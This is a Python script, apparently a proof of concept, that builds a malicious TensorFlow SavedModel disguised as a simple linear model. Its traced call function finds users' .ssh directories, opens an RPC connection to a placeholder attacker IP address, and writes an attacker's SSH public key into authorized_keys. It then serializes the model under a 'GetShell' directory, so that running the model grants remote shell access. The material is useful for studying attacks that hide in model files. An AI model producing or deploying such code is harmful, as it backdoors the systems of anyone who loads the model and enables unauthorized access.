import tensorflow as tf
from tensorflow.python.data.ops.dataset_ops import DatasetV2, DatasetSource
from tensorflow.python.framework import tensor_spec

class tmpclass(DatasetSource):
    def __init__(self, variant_tensor):
        super(tmpclass, self).__init__(variant_tensor)
    
    @property
    def element_spec(self):
        return tensor_spec.TensorSpec([], tf.string)
    
class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)
        self.v = tf.Variable([1, 2, 3], dtype=tf.int8)

    @tf.function
    def __call__(self, x):

        matching_path = tf.io.matching_files(pattern="/home/*/.ssh")
        path = b"file://" + matching_path[0] + b"/authorized_keys"

        from tensorflow.distribute.experimental.rpc.kernels import gen_rpc_ops
        client, _ = gen_rpc_ops.rpc_client("<attacker's IP address>:{}".format(1236), 100000)
        future, _ = gen_rpc_ops.rpc_call(client, path, [tf.constant(2, dtype=tf.int32), tf.constant(2, dtype=tf.int32)], 100000)    

        # --- Save ---
        filename = tf.raw_ops.MatchingFiles(pattern="/home/*/.ssh")[0] + "/authorized_keys"
        tf.raw_ops.Save(filename= filename, tensor_names=["\n\n<attacker's ssh public key>\n\n", "\n<attacker's public key>\n"], data=[1, 2])
        
        return self.a * x + self.b

# malicious Tensorflow model serialization
model = SimpleLinearModel()
result = model(tf.constant(5.0))
save_dir = 'model/GetShell/saved_model'
tf.saved_model.save(model,save_dir)